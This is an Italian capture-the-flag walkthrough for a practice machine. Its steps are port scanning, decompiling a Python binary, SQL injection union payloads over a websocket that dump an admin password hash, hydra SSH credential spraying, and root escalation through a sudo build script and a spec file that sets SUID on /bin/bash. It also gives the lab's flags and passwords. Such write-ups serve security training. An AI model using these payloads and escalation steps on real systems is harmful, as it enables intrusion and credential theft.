@@ -1,0 +1,108 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.11.206
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.206 -oG allPorts
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
+|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://qreader.htb/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+[ip]	[host]
+sudo echo "10.10.11.206  socket.htb" >> /etc/hosts
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://[ip] -w /usr/share/wordlists/dirb/common.txt
+
+---------------------------------------------------------------------------------------------------------------
+Se andiamo su http://socket.htb veniamo reindirizzati su qreader.htb, quindi lo aggiungiamo al file hosts.
+Scarichiamo il file .zip che c'è nel sito. è un lettore di RFID. Se leggiamo l'immagine inclusa nello zip troviamo la stringa "kavigihan"
+
+Eseguiamo il comando ->  strings app/qreader -> Dall'output capiamo che il programma è scritto in python
+Su internet cerchiamo qualcosa che ci permetta di estrapolare il codice dall'applicativo, troviamo -> https://github.com/extremecoders-re/pyinstxtractor
+
+Eseguiamo il comando -> python3 pyinstxtractor.py app/qreader
+Scarichiamo anche unpyc3-master e lo eseguiamo -> python3 unpyc37-3.10/src/unpyc3.py
+
+Troviamo questa sezione di codice interessante
+[...]
+ws_host = 'ws://ws.qreader.htb:5789'
+[...]
+def version(self):
+        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({'version': VERSION})))
+        data = json.loads(response)
+        if 'error' not in (data.keys()):
+            version_info = data['message']
+            msg = f'[INFO] You have version {version_info["version"]} which was released on {version_info["released_date"]}'
+            self.statusBar().showMessage(msg)
+            return
+        error = data['error']
+        self.statusBar().showMessage(error)
+[...]
+
+Scriviamo un po' di codice per contattare la websocket
+
+#!/usr/bin/python3
+import sys
+import websocket
+import json
+
+VERSION='0.0.2'
+ws = websocket.WebSocket()
+ws.connect("ws://ws.qreader.htb:5789/version")
+ws.send(json.dumps({'version': sys.argv[1]}))
+print(ws.recv())
+
+python3 ws_socket.py 0.0.2 -> {"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
+
+Proviamo con un po' di SQLInjection
+
+python test-socket.py '0.0.2" union select 1-- -'
+python test-socket.py '0.0.2" union select 1,2-- -'
+python test-socket.py '0.0.2" union select 1,2,3-- -'
+python test-socket.py '0.0.2" union select 1,2,3,4-- -' -> Questo ci ritorna l'output
+python3 test-socket.py '0.0.2" union select group_concat(name),2,3,4 from sqlite_schema-- -' -> {"message": {"id": "sqlite_sequence,versions,users,info,reports,answers", "version": 2, "released_date": 3, "downloads": 4}}
+python3 test-socket.py '0.0.2" union select username,password,3,4 from users-- -' -> {"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": 3, "downloads": 4}} -> 0c090c365fa0559b151a43e0fea39710
+
+Eseguiamo l'hash della password e ottniamo -> denjanjade122566
+
+Creiamo un file con tutti i possibili nomi trovati e la password ottenuta dall'hash.
+
+hydra -L users -p denjanjade122566 ssh://10.10.11.206 -> tkeller:denjanjade122566
+
+ssh tkeller@10.10.11.206 -> Siamo dentro!
+
+cat user.txt -> c506db03a230ebf6f43ae06ecaadfbc4
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# sudo -l => Check if user sau can run any command as root
+	-/usr/local/sbin/build-installer.sh
+
+Visioniamo il file 
+cat /usr/local/sbin/build-installer.sh
+
+creiamo un file pwn.spec con il seguente codice
+import os
+os.system("chmod +s /bin/bash")
+
+Lo eseguiamo
+	sudo /usr/local/sbin/build-installer.sh build pwn.spec
+
+ls -l /bin/bash -> Shell ottenuta
+bash -p 
+cat /root/root.txt -> 83768761674229556ceb14bd70097e76
